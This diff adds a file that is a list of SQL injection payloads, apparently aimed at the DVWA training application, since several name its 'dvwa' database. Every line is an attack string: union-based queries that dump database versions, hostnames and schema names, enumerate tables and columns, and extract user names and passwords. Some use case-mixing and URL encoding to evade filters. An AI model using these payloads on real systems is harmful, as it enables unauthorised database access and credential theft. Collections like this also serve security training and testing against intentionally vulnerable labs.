@@ -1,0 +1,22 @@
+'% or 0=0 union select null, version() #
+%' or '0' = '0
+1'+OR+1='1
+1+OR+1=1
+%’ UNION SELECT null, concat(user,0x0a,password) FROM users#
+1' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata -- 
+1' UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema='dvwa'-- 
+1'  UniOn Select 1,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name='users'  --
+1'  UniOn Select 1,gRoUp_cOncaT(0x7c,first_name,0x7C) fRoM dvwa.users --
+1'  UniOn Select 1,gRoUp_cOncaT(0x7c,password,0x7C) fRoM dvwa.users --
+1++UniOn+Select+1,gRoUp_cOncaT(0x7c,first_name,0x7C)+fRoM+dvwa.users+--+
+1'  UniOn Select 1,gRoUp_cOncaT(0x7c,first_name,0x7C) fRoM dvwa.users; -- 
+test'union select null, version()#
+test'union select null, @@version()#
+' union select null, @@hostname#
+test' union select null, user() #
+test' union select null, database() #
+test' and 1=0 union select null, table_name from information_schema.tables #
+test' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+test' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
+test' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+
